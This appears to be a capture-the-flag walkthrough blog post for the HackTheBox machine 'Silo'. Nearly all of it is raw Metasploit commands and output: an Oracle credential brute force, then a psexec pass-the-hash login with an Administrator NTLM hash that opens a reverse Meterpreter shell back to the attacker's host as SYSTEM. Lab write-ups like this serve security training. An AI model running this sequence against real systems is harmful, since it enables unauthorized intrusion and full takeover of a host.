---
title: "HackTheBox - Silo"
date: 2010-01-01T01:01:56+01:00
toc: false
images:
tags:
  - hackthebox
  - ctf
---

[![Kurzes Video Walkthrough ohne Erklärungen](http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg)](http://www.youtube.com/watch?v=YOUTUBE_VIDEO_ID_HERE)

root@kali:~# msfconsole

msf > use admin/oracle/oracle_login  
msf auxiliary(admin/oracle/oracle_login) > set rhost 10.10.10.82  
rhost => 10.10.10.82  
msf auxiliary(admin/oracle/oracle_login) > set sid XE  
sid => XE  
msf auxiliary(admin/oracle/oracle_login) > run

[*] Starting brute force on 10.10.10.82:1521...  
[+] Found user/pass of: scott/tiger on 10.10.10.82 with sid XE  
[*] Auxiliary module execution completed  
msf auxiliary(admin/oracle/oracle_login) >

msf exploit(windows/smb/psexec) > show options

Module options (exploit/windows/smb/psexec):

Name Current Setting Required Description  
---- --------------- -------- -----------  
RHOST 10.10.10.82 yes The target address  
RPORT 445 yes The SMB service port (TCP)  
SERVICE_DESCRIPTION no Service description to to be used on target for pretty listing  
SERVICE_DISPLAY_NAME no The service display name  
SERVICE_NAME no The service name  
SHARE ADMIN$ yes The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share  
SMBDomain . no The Windows domain to use for authentication  
SMBPass aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 no The password for the specified username  
SMBUser Administrator no The username to authenticate as

Payload options (windows/meterpreter/reverse_tcp):

Name Current Setting Required Description  
---- --------------- -------- -----------  
EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none)  
LHOST tun0 yes The listen address (an interface may be specified)  
LPORT 443 yes The listen port

Exploit target:

Id Name  
-- ----  
0 Automatic

msf exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.191:443  
[*] 10.10.10.82:445 - Connecting to the server...  
[*] 10.10.10.82:445 - Authenticating to 10.10.10.82:445 as user 'Administrator'...  
[*] 10.10.10.82:445 - Selecting PowerShell target  
[*] 10.10.10.82:445 - Executing the payload...  
[+] 10.10.10.82:445 - Service start timed out, OK if running a command or non-service executable...  
[*] Sending stage (179779 bytes) to 10.10.10.82  
[*] Meterpreter session 2 opened (10.10.14.191:443 -> 10.10.10.82:49165) at 2018-08-21 05:39:49 -0400

meterpreter > getuid  
Server username: NT AUTHORITY\SYSTEM  
meterpreter > shell  
Process 2508 created.  
Channel 1 created.  
Microsoft Windows [Version 6.3.9600]  
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>